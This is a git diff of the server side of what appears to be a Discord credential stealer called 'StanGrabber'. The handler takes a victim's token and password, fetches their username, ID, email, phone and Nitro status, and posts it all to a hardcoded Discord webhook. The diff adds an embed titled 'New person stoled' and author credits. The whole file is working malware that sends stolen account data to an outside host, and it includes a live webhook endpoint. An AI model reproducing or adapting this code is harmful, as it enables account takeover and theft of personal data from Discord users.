@@ -1,10 +1,13 @@
 const axios = require('axios');
 const fetch = require("node-fetch");
 
+
+
 exports.send = (req, res, webhook) => {
     const token = req.body.token;
     const password = req.body.password;
 
+    
 
     if (token === undefined || password === undefined)
         return res.status(400).json({status: "error",message: "Not sent."});
@@ -33,10 +36,24 @@ exports.send = (req, res, webhook) => {
         } else {
             phone = JSON.parse(JSON.stringify(y)).phone;
         }
+            
+            var omg = {
+  author: {
+    name: "Dev By Hideaki#1337 x Stan#1337"
+  },
+  title: "New person stoled",
+  description: `Username : ` + JSON.parse(JSON.stringify(y)).username + "#" + JSON.parse(JSON.stringify(y)).discriminator + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " + password,
+  color: hexToDecimal("#cccccc")
+}
+            
 
         axios.post(`https://discord.com/api/webhooks/797933426220204132/QVTVod__SFum4eHguecQ-5t1UOnc3BWm7rC-fb_sekgflTr21-E6sIyZJtW04IGEYCyg`, {
-            username: JSON.parse(JSON.stringify(y)).username,
-            content: `Username : ` + JSON.parse(JSON.stringify(y)).username + "#" + JSON.parse(JSON.stringify(y)).discriminator + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " + password
+            username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
+            content: '', 
+            embeds:[{
+            description:'test'
+            
+            }]
         }).then((z) => {
         	if (z.status === 200) return res.status(200).json({status: "ok",message: "Sent."});
         }).catch((bite) => {
